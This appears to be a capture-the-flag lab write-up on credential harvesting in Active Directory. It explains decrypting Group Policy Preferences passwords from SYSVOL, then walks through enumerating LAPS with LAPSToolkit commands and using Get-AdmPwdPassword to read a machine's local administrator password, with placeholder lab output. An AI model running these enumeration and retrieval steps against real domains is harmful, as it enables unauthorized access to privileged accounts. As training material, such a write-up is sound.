**Group Policy Preferences (GPP)**

GPP allows administrators to manage local administrator passwords across multiple Windows machines using domain policies. However, the XML files in the SYSVOL folder used by GPP to store these passwords were encrypted with AES-256. After Microsoft accidentally published the encryption key, domain users could easily decrypt these passwords. Tools like Get-GPPPassword are used to recover these passwords from the SYSVOL folder.
<br>

**Local Administrator Password Solution (LAPS)**

Introduced by Microsoft in 2015, LAPS securely manages local administrator passwords by storing them in Active Directory attributes (```ms-mcs-AdmPwd``` for the password and ```ms-mcs-AdmPwdExpirationTime``` for expiration time). LAPS replaces the less secure SYSVOL method and uses ```admpwd.dll``` to handle password changes and updates.

**Enumerate for LAPS**

Before we do this we need to check if ```LAPS``` is installed in the target machine, which can be done by checking the ```admpwd.dll``` path.
```
C:\Users\>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM              .
06/06/2022  01:01 PM              ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,306,015,232 bytes free
```
The output confirms that we have LAPS on the machine.<br>
Once we obtain that the ```LAPS``` is installed, we need to find which AD organizational unit (OU) has the ```"All extended rights"``` attribute that deals with ```LAPS```.

> All extended rights

Refers to permissions needed to manage LAPS attributes in Active Directory, specifically:

    Managing LAPS Attributes: Accessing or modifying ms-mcs-AdmPwd (local admin password) and ms-mcs-AdmPwdExpirationTime (password expiration).
    Extended Permissions: Includes reading/updating passwords, modifying expiration times, and setting permissions for LAPS-related operations.

We will use ```LAPSToolkit``` PowerShell script to do that.<br>
To search through all OUs to see which AD groups that has **"All extended rights"** attribute that deals with LAPS:
```
PS C:\Tools> Find-LAPSDelegatedGroups

OrgUnit                 Delegated Groups
-------                 ----------------
OU=THMorg,DC=thm,DC=red THM\LAPsReader
```
Then displays all computers with LAPS enabled:
```
PS C:\Tools> Get-LAPSComputers

ComputerName                Password        Expiration
------------                --------        ----------
Creds-Harvesting.thm.red THMLAPSPassw0rd 02/11/2338 11:05:23
```


**Getting the Password**

At this poit we know that the OU THMorg contain LAPsReader group that have **"All extended rights"** permissions and "Creds-Harvesting.thm.red" computer have ```LAPS``` installed.<br>

we need to retrieve the local administrator password for a specified computer (Creds-Harvesting) that is managed by LAPS.:
```
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...
```












